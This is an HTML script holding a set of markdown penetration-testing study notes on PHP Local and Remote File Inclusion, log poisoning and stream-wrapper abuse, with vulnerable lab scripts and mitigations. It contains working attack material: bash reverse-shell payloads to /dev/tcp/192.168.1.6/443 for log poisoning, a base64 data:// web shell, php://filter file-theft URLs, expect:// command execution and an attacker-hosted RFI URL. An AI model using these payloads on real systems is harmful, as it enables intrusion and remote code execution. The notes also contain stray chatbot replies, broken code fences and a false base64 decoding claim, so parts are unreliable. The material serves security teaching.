<script>
const NOTES = [{"name": "LFI", "content": "# Local File Inclusion (LFI) Security Notes\n\n## Definition\n\nLocal File Inclusion (LFI) is a web security vulnerability where an attacker tricks a web application into including files that exist on the same server. This happens when user-supplied input is used unsafely to specify files for inclusion, often via PHP functions like `include()` or `require()`.\n\n## How LFI Works\n\nDevelopers sometimes dynamically include files based on user input to load different pages or content. If this input is not properly validated or sanitized, attackers can manipulate paths to include unintended files such as sensitive configuration files or system files.\n\n### Example Vulnerable Code\n\n```php\n<?php\n$file = $_GET['file'];\ninclude('pages/' . $file);\n?>\n```\n\n### Attack Example\n\nIf an attacker requests:\n\n```\nhttp://example.com/index.php?file=../../../etc/passwd\n```\n\nThey might be able to cause the server to include and reveal the contents of `/etc/passwd`, which is a critical system file.\n\n## Differences Between LFI and Directory Traversal\n\n- **LFI**: Includes and executes files **within** the web server's directory or its subdirectories\n- **Directory Traversal**: Reads files from **outside** the web root but usually without executing them\n\n## Risks of LFI\n\n- Reading sensitive files (passwords, config files)\n- Remote code execution if attacker can include uploaded malicious files or use PHP wrappers\n- Privilege escalation and full server compromise\n\n## Common LFI Attack Techniques\n\n### Path Traversal\n\nUsing sequences like `../` to move up directories.\n\n### Null Byte Injection (Historical)\n\nTo truncate string extensions (less relevant in modern PHP versions).\n\n### PHP Wrappers\n\nUsing wrappers like `php://filter` to read source code as plain text.\n\n### Log Poisoning\n\nInjecting PHP code into logs and including them.\n\n## Example Scripts Analysis\n\n### Script 1: local-file-inclusion.php (Basic Vulnerable Example)\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>Local File Inclusion</title>\n</head>\n<body>\n\n<h1>Local File Inclusion</h1>\n\n<?php\nif (isset($_REQUEST[\"file\"])) {\n    include($_REQUEST[\"file\"]);\n}\n?>\n\n</body>\n</html>\n```\n\n**Vulnerability**: Direct inclusion of user input without any validation.\n\n### Script 2: local-file-inclusion-2.php (Attempted Mitigation - Still Vulnerable)\n\n```html\n<!DOCTYPE html>\n\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>Local File Inclusion</title>\n</head>\n<body>\n\n<h1>Local File Inclusion</h1>\n\n<?php\nif (isset($_REQUEST[\"file\"])) {\n    // Prepend the directory to the user-supplied filename\n    $local_file = \"includes/\" . $_REQUEST[\"file\"];\n    include($local_file);\n}\n?>\n\n</body>\n</html>\n```\n\n**Issue**: Still vulnerable to path traversal attacks like `../../../etc/passwd`.\n\n### Script 3: local-file-inclusion-3.php (Absolute Path - Still Vulnerable)\n\n```html\n<!DOCTYPE html>\n\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>Local File Inclusion</title>\n</head>\n<body>\n\n<h1>Local File Inclusion</h1>\n\n<?php\nif (isset($_REQUEST[\"file\"])) {\n    // Absolute path concatenated with user input\n    $local_file = \"/var/www/html/webpentest/includes/\" . $_REQUEST[\"file\"];\n    \n    include($local_file);\n}\n?>\n\n</body>\n</html>\n```\n\n### How Script 3 Works:\n\n- The script receives the `file` parameter from the HTTP request\n- Concatenates it with a fixed absolute directory path: `/var/www/html/webpentest/includes/`\n- Includes the resulting file\n\n### Security Considerations for Script 3:\n\n**Issue**: Path traversal can still be used to escape the intended directory using sequences like `../../../etc/passwd`.\n\n## Mitigation Best Practices\n\n### Input Validation and Sanitization\n\n- Validate and sanitize all user inputs used in file paths\n- Use strict allowlists of permitted files\n\n### Use Whitelists\n\n- Use whitelist of allowed files instead of user input directly\n- Example: Map user input to predefined safe file names\n\n### Disable Dangerous PHP Settings\n\n- Disable `allow_url_include=off` in PHP configuration\n- Consider disabling `allow_url_fopen` if not needed\n\n### Least Privilege\n\n- Employ least privilege for web server user\n- Restrict file system permissions\n\n### Keep Software Updated\n\n- Keep software and dependencies updated\n- Apply security patches promptly\n\n### Additional Security Measures\n\n- Implement proper access controls\n- Use Web Application Firewalls (WAF)\n- Regular security audits and penetration testing\n- Monitor logs for suspicious file inclusion attempts\n\n## Security Testing Considerations\n\nWhen testing for LFI vulnerabilities:\n\n- Test various path traversal sequences (`../`, `..\\\\`, etc.)\n- Try different file types and system files\n- Test with URL encoding and double encoding\n- Check for null byte injection (in older systems)\n- Test PHP wrappers if PHP is used\n\n## Key Takeaways\n\n1. Never trust user input when constructing file paths\n2. Always validate and sanitize input\n3. Use whitelists instead of blacklists when possible\n4. Implement defense in depth with multiple security layers\n5. Regular security testing is essential\n6. Keep systems and dependencies updated"}, {"name": "Log poisoning", "content": "# 🔒 Log Poisoning Vulnerability\n\n## 📋 Overview\n\n**Log Poisoning** is a sophisticated web application attack where malicious input is injected into application or server log files (such as Apache access/error logs) with the intent of later executing this input as code, typically by exploiting a Local File Inclusion (LFI) vulnerability.\n\n---\n\n## 🎯 Attack Mechanism\n\n### Primary Attack Vector\n\nAttackers inject **PHP code** into logs via HTTP headers (like User-Agent), then trigger the code by including the poisoned log file in a PHP context.\n\n### Attack Flow\n\n```\n1. Inject malicious code → Log files\n2. Exploit LFI vulnerability → Include poisoned log\n3. Execute injected code → Remote Code Execution (RCE)\n```\n\n---\n\n## 📁 Common Log File Targets\n\nAttackers may attempt to poison the following system log files:\n\n|#|Log File Path|\n|---|---|\n|1|`/var/log/apache/access.log`|\n|2|`/var/log/apache/error.log`|\n|3|`/var/log/apache2/access.log`|\n|4|`/var/log/apache2/error.log`|\n|5|`/var/log/nginx/access.log`|\n|6|`/var/log/nginx/error.log`|\n|7|`/var/log/vsftpd.log`|\n|8|`/var/log/sshd.log`|\n|9|`/var/log/mail`|\n|10|`/var/log/httpd/error_log`|\n|11|`/usr/local/apache/log/error_log`|\n|12|`/usr/local/apache2/log/error_log`|\n|13|`/var/log/auth.log`|\n|14|`/var/log/kern.log`|\n|15|`/var/log/user.log`|\n|16|`/var/log/apt/term.log`|\n|17|`/var/log/apt/history.log`|\n|18|`/var/log/apache2/other_vhosts_access.log`|\n|19|`/var/log/apache2/access.log`|\n|20|`/var/log/apache2/error.log`|\n|21|`/var/log/fontconfig.log`|\n|22|`/var/log/dpkg.log`|\n|23|`/var/log/installer/Xorg.0.log`|\n|24|`/var/log/daemon.log`|\n|25|`/var/log/alternatives.log`|\n|26|`/var/log/mysql/error.log`|\n|27|`/run/initramfs/fsck.log`|\n\n---\n\n## ⚠️ Risk Factors\n\n### File Permission Vulnerabilities\n\n```bash\nchmod 777 <logfile>\n```\n\nFiles with permissions like `chmod 777` become **writable or world-readable**, dramatically increasing exploitation risk.\n\n---\n\n## 💻 Sample Vulnerable PHP Code\n\n**Filename:** `local-file-inclusion3.php`\n\n```php\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Local File Inclusion</title>\n</head>\n<body>\n<h1>Local File Inclusion</h1>\n<?php\nif (isset($_REQUEST[\"file\"])) {\n    $local_file = \"log/\" . $_REQUEST[\"file\"] . \".log\";\n    include($local_file);\n}\n?>\n</body>\n</html>\n```\n\n### Vulnerability Analysis\n\n- **Line 9-10:** Accepts user input via `$_REQUEST[\"file\"]`\n- **Line 10:** Constructs file path with user-controlled input\n- **Line 11:** Uses `include()` to execute the file content\n- **No input validation or sanitization**\n\n---\n\n## 🚀 Attacker Payloads\n\n### Log File Poisoning Techniques\n\nMalicious PHP code sent via HTTP headers (e.g., User-Agent) or SSH username:\n\n#### Payload 1: Command Execution with exec()\n\n```php\n<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/192.168.1.6/443 0>&1\"'); ?>\n```\n\n#### Payload 2: Command Execution with system()\n\n```php\n<?php system('bash -i >& /dev/tcp/192.168.1.6/443 0>&1'); ?>\n```\n\n#### Payload 3: Simple Command Injection\n\n```php\n<?php echo system($_GET['cmd']); ?>\n```\n\n#### Payload 4: Alternative Syntax\n\n```bash\nsimple_aac_recording0\nbash -c 'bash -i >& /dev/tcp/192.168.1.6/443 0>&1'\n```\n\n---\n\n## 🔗 Exploitation URLs\n\n### Example Attack Patterns\n\n```\nhttp://target.com/local-file-inclusion3.php?file=../../../var/log/apache2/access\nhttp://target.com/vulnerable.php?page=../../../var/log/nginx/access\nhttp://target.com/index.php?file=../../var/log/auth\n```\n\nThe attacker:\n\n1. First poisons the log by sending malicious User-Agent\n2. Then accesses the vulnerable page with LFI parameter pointing to the poisoned log\n3. The PHP code in the log gets executed\n\n---\n\n## 🛡️ Prevention & Mitigation\n\n### Security Best Practices\n\n1. **Input Validation**\n    \n    - Whitelist allowed file names\n    - Sanitize all user inputs\n    - Reject path traversal sequences (`../`, `..\\\\`)\n2. **Secure File Permissions**\n    \n    - Restrict log file permissions (`chmod 640` or `600`)\n    - Ensure web server cannot write to sensitive logs\n3. **Disable Dangerous Functions**\n    \n    ```php\n    disable_functions = exec,passthru,shell_exec,system,proc_open,popen\n    ```\n    \n4. **Use Absolute Paths**\n    \n    - Avoid concatenating user input with file paths\n    - Use basename() to strip directory components\n5. **WAF & Monitoring**\n    \n    - Deploy Web Application Firewall\n    - Monitor logs for suspicious patterns\n    - Alert on abnormal User-Agent strings\n6. **Principle of Least Privilege**\n    \n    - Run web server with minimal permissions\n    - Separate log directories from web root\n\n---\n\n## 📚 References\n\n- **OWASP:** Local File Inclusion\n- **CVE Database:** LFI/RFI Vulnerabilities\n- **CWE-98:** Improper Control of Filename for Include/Require Statement\n\n---\n\n> ⚠️ **Disclaimer:** This documentation is for educational purposes only. Unauthorized access to computer systems is illegal.\n\n---\n\n_Document Version: 1.0 | Last Updated: January 2026_"}, {"name": "PHP Wrappers for Local File Inclusion (LFI) Exploitation", "content": "\n# PHP Wrappers for Local File Inclusion (LFI) Exploitation\n\nPHP wrappers are special stream wrappers that allow interaction with various resources like files, filters, compression, or network protocols. Attackers exploit these wrappers in LFI vulnerabilities to read, decode, or execute code remotely.\n\n---\n\n## Common PHP Wrappers and Usage Examples\n\n### 1. `php://filter`\n\nUsed to read or transform file contents via filters before inclusion.\n\n**Popular filters include:**\n- `string.rot13` - Applies ROT13 encoding to the file content.\n- `convert.iconv.utf-8.utf-16` - Converts character encoding from UTF-8 to UTF-16.\n- `convert.base64-encode` - Base64-encodes the file content.\n- `zlib.deflate` - Compresses the content with zlib deflate, which can be decoded offline.\n\n🔗 [https://rot13.com/](https://rot13.com/)\n\n#### Examples:\n\n**ROT13 encoding inclusion (decode files encoded with ROT13):**\n```\n\nphp://filter/read=string.rot13/resource=../dvwa/config/config.inc.php\n\n```\n\n**Example Link:**\n```\n\nhttp://192.168.1.31/web-pentest/local-file-inclusion.php?file=php://filter/read=string.rot13/resource=../dvwa/config/config.inc.php?\n\n```\n\n**Base64 encoded output for easy extraction:**\n```\n\nphp://filter/convert.base64-encode/resource=../dvwa/config/config.inc.php\n\n```\n\n**Example Link:**\n```\n\nhttp://192.168.1.31/web-pentest/local-file-inclusion.php?file=php://filter/convert.base64-encode/resource=../dvwa/config/config.inc.php?\n# direct decode by command content | base64 -d | tee test.txt\n```\n\n**Deflate compression compatible with base64 encoding for compact extraction:**\n```\n\nphp://filter/zlib.deflate/convert.base64-encode/resource=../dvwa/config/config.inc.php\n# echo -n contenct | base64 -d | tee zlib.txt\nphp -a \n readfile('php://filter/zlib.inflate/resource=zlib.txt)\n```\n\n**The `convert.iconv.UTF-8.UTF-16` filter is a PHP stream filter that converts the character encoding of a file from UTF-8 to UTF-16.**\n```\n\nphp://filter/convert.iconv.utf-8.utf-16/resource=../dvma/config/config.inc.php\n\n# direct burp decoding\n\n```\n\n---\n\n### 2. `data://` Wrapper\n\n- Allows inclusion of inline data encoded usually in base64.\n- Commonly used to directly execute PHP payloads encoded in base64.\n\n#### Example:\n```\n\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+\n\n```\n\n**Example Link:**\n```\n\nhttp://192.168.1.31/web-pentest/local-file-inclusion.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+=.3\n\n```\n\n`PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+==` decodes to `<?php phpinfo(); ?>`\n\n---\n\n### 3. `expect://` Wrapper\n\n- Allows execution of system commands and captures the output.\n- Requires the `expect` extension to be installed and enabled.\n- Can be used to execute shell commands directly.\n\n#### Example:\n```\n\nexpect://id\n\n```\n\n**Example Link:**\n```\n\nhttp://192.168.1.31/web-pentest/local-file-inclusion.php?file=expect://id?\n\n```\n# only valid less than 7 php version---\n\n### 4. `ssh2://` Wrapper\n\n- Enables accessing files over SSH.\n- Requires `libssh2` and `php-ssh2` extensions installed.\n- Not commonly enabled by default, but powerful if exploitable.\n\nI can see you're looking at PHP wrapper documentation for local file inclusion exploitation. Here's the content formatted in a decorative way:\n\n---\n\n## 🔧 **PHP SSH2 Installation Guide**\n\n### **Step 1: Install Dependencies**\n\nbash\n\n```bash\napt install libssh2-1 libssh2-1-dev php-dev php-pear\n```\n\n### **Step 2: Install PHP SSH2 Extension via PECL**\n\nbash\n\n````bash\npecl install ssh2-1.3.1\n```\n\n> 💡 *Version may update, check with* `pecl search ssh2`\n\n---\n\n### **⚙️ Configuration**\n\nDuring the compilation step of the `ssh2` extension, this line appears:\n```\nlibssh2 prefix? [autodetect] :\n````\n\nPECL is asking: _\"Where is the libssh2 library installed?\"_\n\n---\n\n### **Step 3: Enable Extension on Debian**\n\nbash\n\n```bash\necho \"extension=ssh2.so\" | tee /etc/php/*/mods-available/ssh2.ini\n```\n\n**If the file doesn't exist, create it manually:**\n\nbash\n\n```bash\nvim /etc/php/8.2/mods-available/ssh2.ini\n```\n\n**Add this single line:**\n\nini\n\n```ini\nextension=ssh2.so\n```\n\n---\n\n### **Step 4: Enable the Module**\n\nbash\n\n```bash\nphpenmod ssh2\n```\n\n---\n\n### **Step 5: Restart Apache**\n\nbash\n\n```bash\nsystemctl restart apache2\n```\n\n\n## Example Usage\n\n### File: `ssh2-connect.php`\n\n`<?php $connection = ssh2_connect('192.168.1.32', 22); ssh2_auth_password($connection, 'root', 'root');  $stream = ssh2_exec($connection, 'ls -la'); stream_set_blocking($stream, true); $output = stream_get_contents($stream); fclose($stream);  echo $output; ?>`\n\n---\n\n## Using the `ssh2://` Wrapper\n\n`<?php $connection = ssh2_connect('example.com', 22); ssh2_auth_password($connection, 'username', 'password');  $sftp = ssh2_sftp($connection); $stream = fopen(\"ssh2.sftp://$sftp/home/username/test.txt\", \"r\"); echo stream_get_contents($stream); fclose($stream); ?>`\n\n---\n\n## Practical Lab Example – `ssh2-wrapper.php`\n\n`<?php $connection = ssh2_connect('192.168.1.32', 22); ssh2_auth_password($connection, 'root', 'root');  $sftp = ssh2_sftp($connection); $stream = fopen(\"ssh2.sftp://$sftp/root/phpinfo.php\", \"r\"); $code = stream_get_contents($stream); fclose($stream);  eval('?>' . $code); ?>`\n\n---\n\n## Notes (Educational Context)\n\n- `ssh2_connect()` establishes an SSH connection\n    \n- `ssh2_exec()` executes remote commands\n    \n- `ssh2.sftp://` allows file access via SFTP\n    \n- `eval()` executes fetched PHP code (**dangerous in real-world apps**)\n    \n- Commonly demonstrated in **LFI → RCE** or **wrapper abuse** labs\n    \n\n---\n\n## Related Topics\n\n- Local File Inclusion (LFI)\n    \n- PHP Stream Wrappers\n    \n- Remote File Execution\n    \n- OSCP-style vulnerable labs\n---\n\n### 5. Archive Wrappers: `zip://` and `rar://`\n\n- Allow accessing files inside archive formats.\n- **Example:** Accessing a PHP file inside a ZIP archive.\n\n```\n\nzip phpinfo.zip phpinfo.php\n\n```\n\nThen access the file inside the ZIP:\n```\n\nzip:///var/www/html/php/upload/phpinfo.zip#phpinfo.php\n\n```\n\n\n15:44\nmarkdown\n# PHP Wrappers for Local File Inclusion Exploitation\n\n## 📦 ZIP Wrapper\n\n### Overview\n- Lets you read files inside ZIP archives.\n\n### Check ZIP Support\n```bash\nphp -m | grep zip\n```\n\n## 📦 RAR Wrapper\n\n### Overview\n- Comes from the PECL RAR extension (not built-in).\n- Lets you read files inside RAR archives.\n- Requires installing:\n\n### Installation\n\n#### On Debian/Ubuntu:\n```bash\napt install unrar php-dev php-pear\n```\n\n#### Using PECL:\n```bash\npecl install rar\n```\n\n### Enable in PHP:\n```bash\necho \"extension=rar.so\" | sudo tee /etc/php/*/mods-available/rar.ini\n```\n```bash\nphpenmod rar\n```\n```bash\nsystemctl restart apache2\n```\n\n### Verify Installation:\n```bash\nphp -m | grep rar\n```\n\n### Create Test Files:\n```bash\nzip phpinfo.zip phpinfo.php\n```\n\n## 🔓 Accessing Files Inside Archives\n\n### ZIP Protocol:\n```\nzip://var/www/html/php/upload/phpinfo.zip#phpinfo.php\n```\n\n### Example URL (Local File Inclusion):\n```\nhttp://192.168.1.31/web-pentest/local-file-inclusion.php?file=zip://../dvwa/config/config.inc.php\n```\n\n---\n\n## 🎯 Usage Example:\n\nWhen a web application has a Local File Inclusion (LFI) vulnerability, you can:\n\n1. Upload a ZIP/RAR archive containing malicious PHP files\n2. Use the `zip://` or `rar://` wrapper to access files inside the archive\n3. Execute arbitrary PHP code through the inclusion vulnerability\n\n### Exploitation Flow:\n```\nUpload Archive → Access via wrapper → Code Execution\n```\n\n---\n\n## ⚠️ Security Note\n\nThis technique demonstrates how PHP wrappers can be abused in vulnerable applications. Always:\n- Validate and sanitize file paths\n- Disable dangerous PHP wrappers in production\n- Implement proper access controls\n- Never trust user input for file operations\n\n---\n\n## 📚 References\n\n- [PHP Stream Wrappers Documentation](https://www.php.net/manual/en/wrappers.php)\n- [OWASP - File Inclusion Vulnerabilities](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)\n\n---\n\n**Example Link:** 🔗\n\n---\n\n## Summary Table of PHP Wrappers for LFI\n\n| **Wrapper**      | **Purpose/Description**                        | **Requirements**                     | **Example Use Case**                  |\n|------------------|------------------------------------------------|--------------------------------------|---------------------------------------|\n| `php://filter`   | Read file contents with filters (base64, rot13, etc.) | No extra extensions needed           | Base64 encode a PHP file for extraction |\n| `data://`        | Inject inline data / code                      | PHP supports data wrapper            | Inject PHP code encoded in base64     |\n| `expect://`      | Execute system commands                        | PHP `expect` extension installed     | Run `id` command on server            |\n| `ssh2://`        | Access files via SSH                           | `libssh2` and `php-ssh2` installed   | Access remote SSH files               |\n| `zip://`         | Access files inside ZIP archives               | ZIP extension enabled                | Include PHP file inside ZIP uploads   |\n| `rar://`         | Access files inside RAR archives               | RAR extension enabled                | Include files inside RAR archives     |\n\n---\n\n```"}, {"name": "RFI", "content": "# Remote File Inclusion (RFI) in PHP\n\n## What is Remote File Inclusion (RFI)?\n\nRemote File Inclusion (RFI) is a **critical vulnerability** that allows an attacker to include and execute code from a remote server by exploiting PHP scripts that include files based on user input.\n\n## How RFI Works\n\nRFI occurs when:\n\n1. PHP's `allow_url_include` directive is enabled\n2. User input is directly used in file inclusion functions without proper validation\n3. An attacker can specify a remote URL containing malicious code\n\n## Enabling RFI (Testing Purposes Only - NOT Recommended in Production)\n\n### Step 1: Edit PHP Configuration\n\nOpen the PHP configuration file (e.g., PHP 7.3 on Apache):\n\nbash\n\n```bash\nvim /etc/php/7.3/apache2/php.ini\n```\n\n### Step 2: Set the Directive\n\nFind and set the following directive:\n\nini\n\n```ini\nallow_url_include = On\n```\n\n### Step 3: Restart Apache\n\nApply the changes:\n\nbash\n\n```bash\nsystemctl restart apache2.service\n```\n\n## Understanding `allow_url_include`\n\n|Configuration|Description|Default Value|Risk Level|\n|---|---|---|---|\n|`allow_url_include`|Allows PHP to include remote files via URLs|Off|**High** if set to On (can enable RFI attacks)|\n\n## Example of Vulnerable PHP Code\n\n### Basic Vulnerable Script (remote-file-inclusion-1.php)\n\nphp\n\n```php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Remote File Inclusion</title>\n</head>\n<body>\n    <h1>Remote File Inclusion</h1>\n    \n    <?php\n    if (isset($_REQUEST['file'])) {\n        include($_REQUEST['file']); // Vulnerable to RFI if allow_url_include = On\n    }\n    ?>\n</body>\n</html>\n```\n\n### How the Attack Works\n\n1. **The PHP script includes a file based on the `file` parameter in the request**\n2. **If PHP's `allow_url_include` directive is set to `On` in php.ini, the script will fetch and include remote files when specified via a URL**\n\n### Attack Example\n\nIf `allow_url_include` is set to `On`, and an attacker requests:\n\n```\nhttp://example.com/index.php?page=http://attacker.com/malicious.php\n```\n\n**Result:** The malicious PHP code hosted on the attacker's server will be executed on the victim's server.\n\n## Security Recommendations\n\n### 🔒 Primary Defenses\n\n1. **Keep `allow_url_include` set to `Off` in production**\n    - This is the default and most important protection\n2. **Avoid including files based on unsanitized user input**\n    - Never directly use `$_GET`, `$_POST`, or `$_REQUEST` values in include statements\n3. **Use whitelisting or strict validation for any file includes**\n    - Only allow specific, predefined files to be included\n4. **Update PHP to versions where this feature is disabled by default**\n    - Newer PHP versions have better security defaults\n\n### 🛡️ Additional Security Measures\n\n- **Input validation and sanitization**\n- **Use absolute paths instead of relative paths**\n- **Implement proper access controls**\n- **Regular security audits and code reviews**\n\n## Secure Code Examples\n\n### Example 1: Whitelist Approach\n\nphp\n\n```php\n<?php\n$allowed_files = [\n    'home' => 'pages/home.php',\n    'about' => 'pages/about.php',\n    'contact' => 'pages/contact.php'\n];\n\n$page = $_GET['page'] ?? 'home';\n\nif (array_key_exists($page, $allowed_files)) {\n    include $allowed_files[$page];\n} else {\n    include 'pages/404.php';\n}\n?>\n```\n\n### Example 2: Path Validation\n\nphp\n\n```php\n<?php\n$page = $_GET['page'] ?? '';\n$page = basename($page); // Remove directory traversal attempts\n$file_path = 'pages/' . $page . '.php';\n\n// Check if file exists and is within allowed directory\nif (file_exists($file_path) && strpos(realpath($file_path), realpath('pages/')) === 0) {\n    include $file_path;\n} else {\n    include 'pages/404.php';\n}\n?>\n```\n\n## Key Takeaways\n\n- **RFI is a critical security vulnerability** that can lead to complete system compromise\n- **`allow_url_include` should always be disabled in production environments**\n- **Never trust user input** when including files\n- **Use whitelisting and validation** for any dynamic file inclusion\n- **Regular security testing** is essential to identify such vulnerabilities\n\n## Testing and Detection\n\n### Manual Testing\n\n- Check if `allow_url_include` is enabled: `php -m | grep -i url`\n- Test with remote URLs in file inclusion parameters\n- Look for error messages that reveal file paths\n\n### Automated Tools\n\n- Use vulnerability scanners to detect RFI vulnerabilities\n- Code analysis tools can identify unsafe include patterns\n- Regular penetration testing\n\n\n# Remote File Inclusion (RFI) Vulnerability Examples\n\n## Example 1: remote-file-inclusion-2.php\n\nhtml\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Remote File Inclusion</title>\n</head>\n<body>\n\n<h1>Remote File Inclusion</h1>\n\n<?php\nif (isset($_REQUEST[\"file\"])) {\n    $remote_file = $_REQUEST[\"file\"] . \".html\";\n    include($remote_file);\n}\n?>\n\n</body>\n</html>\n```\n\n### How it Works\n\n- The script looks for the `file` parameter in the URL query string\n- It appends `.html` to the value provided\n- It uses `include()` to load the specified file dynamically\n\n## Example 2: remote-file-inclusion-3.php\n\nhtml\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Remote File Inclusion</title>\n</head>\n<body>\n\n<h1>Remote File Inclusion</h1>\n\n<?php\nif (isset($_REQUEST[\"file\"])) {\n    $remote_file = $_REQUEST[\"file\"] . \".js\";\n    require_once($remote_file);\n}\n?>\n\n</body>\n</html>\n```\n\n### Explanation\n\n- The script takes a `file` parameter from the URL query string\n- It appends the `.js` extension to the value\n- It includes that file using `require_once()`, which stops further script execution on failure\n\n## Example 3: remote-file-inclusion-4.php\n\nhtml\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Remote File Inclusion</title>\n</head>\n<body>\n\n<h1>Remote File Inclusion</h1>\n\n<?php\nif (isset($_REQUEST[\"file\"])) {\n    $remote_file = $_REQUEST[\"file\"] . \".php\";\n    require_once($remote_file);\n}\n?>\n\n</body>\n</html>\n```\n\n### How it Works\n\n- The script accepts a `file` parameter from the HTTP request\n- It appends `.php` to the user-supplied value\n- The resulting filename or URL is included via `require_once()`\n\n\n# 🎯 Remote File Inclusion (RFI) Vulnerability - Complete Educational Guide\n\n## 📚 **What is Remote File Inclusion?**\n\nRemote File Inclusion is a web application vulnerability that occurs when an application dynamically includes external files based on user-supplied input without proper validation. Attackers can exploit this to execute malicious code on the server.\n\n---\n\n## 🔍 **The Vulnerable Code Examples from Your Screenshots**\n\n### **Example 4: Basic Vulnerable RFI**\n\nphp\n\n```php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Remote File Inclusion</title>\n</head>\n<body>\n\n<h1>Remote File Inclusion</h1>\n\n<?php\nif (isset($_REQUEST[\"file\"])) {\n    $remote_file = $_REQUEST[\"file\"] . \".php\";\n    require_once($remote_file);\n}\n?>\n\n</body>\n</html>\n```\n\n**⚠️ Why it's vulnerable:**\n\n- User input is directly appended with `.php` and included without ANY validation\n- No sanitization of the `file` parameter\n- Allows both remote and local file inclusion\n\n---\n\n### **Example 5: URL Scheme Check (Weak Protection)**\n\nphp\n\n```php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Remote File Inclusion</title>\n</head>\n<body>\n\n<h1>Remote File Inclusion</h1>\n\n<?php\nif (isset($_REQUEST[\"file\"])) {\n    // Append .php extension to the requested file\n    $remote_file = $_REQUEST[\"file\"] . \".php\";\n    \n    // Basic check to prevent remote URL inclusion\n    if (preg_match('/^http|https/', $remote_file)) {\n        require_once($remote_file);  // Include local file only\n    } else {\n        echo \"Error\";\n    }\n}\n?>\n\n</body>\n</html>\n```\n\n**🔴 Security Issues:**\n\n- Only checks URLs starting exactly with `http` or `https`\n- **Bypass methods:**\n    - Alternative protocols: `ftp://`, `file://`, `data://`\n    - Case variations: `HTtp://`, `hTTp://`\n    - URL encoding tricks\n    - Local file paths: `../../../etc/passwd`\n\n---\n\n### **Example 7: Domain Whitelist (Better but Not Perfect)**\n\nphp\n\n```php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Remote File Inclusion</title>\n</head>\n<body>\n\n<h1>Remote File Inclusion</h1>\n\n<?php\nif (isset($_REQUEST[\"file\"])) {\n    $remote_file = $_REQUEST[\"file\"] . \".php\";\n    \n    // Allow only files from domain armourinfosec.com\n    if (preg_match('/\\.armourinfosec\\.com/', $remote_file)) {\n        require_once($remote_file);\n    } else {\n        echo \"Error\";\n    }\n}\n?>\n\n</body>\n</html>\n```\n\n**📊 How It Works:**\n\n- Appends `.php` to the file parameter\n- Checks if the resulting string contains `.armourinfosec.com` using regex\n- Only if check passes, includes the file\n\n**⚠️ Still vulnerable to:**\n\n- Path traversal if attacker controls files on that domain\n- DNS subdomain takeover\n- No validation that resolved path is safe\n\n---\n\n### **Example 8: Filename Pattern Matching**\n\nphp\n\n```php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Remote File Inclusion</title>\n</head>\n<body>\n\n<h1>Remote File Inclusion</h1>\n\n<?php\nif (isset($_REQUEST[\"file\"])) {\n    $remote_file = $_REQUEST[\"file\"] . \".php\";\n    \n    // Only allow inclusion if file name contains 'phpinfo.php'\n    if (preg_match('/\\/phpinfo\\.php/', $remote_file)) {\n        require_once($remote_file);\n    } else {\n        echo \"Error\";\n    }\n}\n?>\n\n</body>\n</html>\n```\n\n**📋 How It Works:**\n\n- Appends `.php` to file parameter\n- Checks if the resulting filename contains the exact string `/phpinfo.php`\n- Only if check passes does it include the file using `require_once()`\n\n**🟡 More restrictive but:**\n\n- Still allows any path as long as it contains `/phpinfo.php`\n- Example: `http://evil.com/phpinfo.php/../../malicious`\n\n---\n\n### **Example 9: Whitelist Array (Most Secure Approach)** ✅\n\nphp\n\n````php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Remote File Inclusion</title>\n</head>\n<body>\n\n<h1>Remote File Inclusion</h1>\n\n<?php\n// Whitelist of allowed PHP files\n$files = array('phpinfo.php', 'index.php');\n\nif (isset($_REQUEST[\"file\"])) {\n    $remote_file = $_REQUEST[\"file\"] . \".php\";\n    \n    // Include file only if in whitelist\n    if (in_array($remote_file, $files)) {\n        require_once($remote_file);\n    } else {\n        echo \"Error\";\n    }\n}\n?>\n\n</body>\n</html>\n```\n\n**✅ How It Works:**\n- Defines a whitelist array `$files` with allowed file names\n- Appends `.php` to user input\n- Uses `in_array()` to check if file is in whitelist\n- Only includes if exact match found\n\n**🟢 Best Practice because:**\n- No path traversal possible\n- No remote file inclusion possible\n- Only pre-approved files can be included\n- Simple and effective\n\n---\n\n## 💣 **Attack Payloads (Educational Purpose Only)**\n\n### **1. FTP Protocol Payload**\n```\nPayload: ftp://192.168.1.6/phpinfo.php\nUsage: ?file=ftp://192.168.1.6/phpinfo\n```\n\n**📝 Explanation:**\n- Attacker hosts 